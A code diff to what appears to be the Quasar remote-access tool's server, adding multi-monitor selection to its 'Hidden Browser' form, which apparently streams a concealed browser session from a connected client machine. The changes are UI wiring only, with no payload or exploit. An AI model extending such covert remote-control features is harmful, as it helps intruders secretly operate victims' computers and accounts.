@@ -42,6 +42,11 @@ namespace Quasar.Server.Forms
 
             RegisterMessageHandler();
             InitializeComponent();
+            cbMonitors.SelectedIndexChanged += (s, e) =>
+            {
+                if (_hiddenBrowserHandler != null && cbMonitors.SelectedIndex >= 0)
+                    _hiddenBrowserHandler.RequestedDisplayIndex = cbMonitors.SelectedIndex;
+            };
             barQuality.ValueChanged += (s, e) =>
             {
                 if (_hiddenBrowserHandler != null)
@@ -70,7 +75,24 @@ namespace Quasar.Server.Forms
             _hiddenBrowserHandler.ProgressChanged -= UpdateImage;
             _hiddenBrowserHandler.KernelInitFailed -= OnKernelInitFailed;
             _hiddenBrowserHandler.CloseGhostResult -= OnCloseGhostResult;
+            _hiddenBrowserHandler.DisplaysChanged -= DisplaysChanged;
             _connectClient.ClientState -= ClientDisconnected;
+        }
+
+        private void DisplaysChanged(object sender, int displays)
+        {
+            void UpdateDisplayList()
+            {
+                cbMonitors.Items.Clear();
+                for (int i = 0; i < displays; i++)
+                    cbMonitors.Items.Add($"Display {i + 1}");
+                if (cbMonitors.Items.Count > 0)
+                    cbMonitors.SelectedIndex = 0;
+            }
+            if (cbMonitors.InvokeRequired)
+                cbMonitors.Invoke((MethodInvoker)UpdateDisplayList);
+            else
+                UpdateDisplayList();
         }
 
         private void OnCloseGhostResult(int result, string message)
@@ -126,11 +148,17 @@ namespace Quasar.Server.Forms
 
         private void StartStream()
         {
+            if (cbMonitors.Items.Count == 0)
+            {
+                MessageBox.Show("No remote display detected.\nPlease wait till the client sends a list with available displays.", "Hidden Browser", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }
+            int selectedDisplay = cbMonitors.SelectedIndex >= 0 ? cbMonitors.SelectedIndex : 0;
             ToggleConfigurationControls(true);
             picDesktop.Start();
             picDesktop.SetFrameUpdatedEvent(frameCounter_FrameUpdated);
             this.ActiveControl = picDesktop;
-            _hiddenBrowserHandler.BeginStream(barQuality.Value);
+            _hiddenBrowserHandler.BeginStream(barQuality.Value, selectedDisplay);
         }
 
         private void StopStream()
@@ -146,6 +174,7 @@ namespace Quasar.Server.Forms
         {
             btnStart.Enabled = !started;
             btnStop.Enabled = started;
+            cbMonitors.Enabled = !started;
             /* Close is always enabled so user can close ghost window anytime. */
             barQuality.Enabled = true;
         }
@@ -167,6 +196,8 @@ namespace Quasar.Server.Forms
         private void FrmHiddenBrowser_Load(object sender, EventArgs e)
         {
             this.Text = WindowHelper.GetWindowTitle("Hidden Browser", _connectClient);
+            _hiddenBrowserHandler.DisplaysChanged += DisplaysChanged;
+            _hiddenBrowserHandler.RefreshDisplays();
             OnResize(EventArgs.Empty);
         }
 
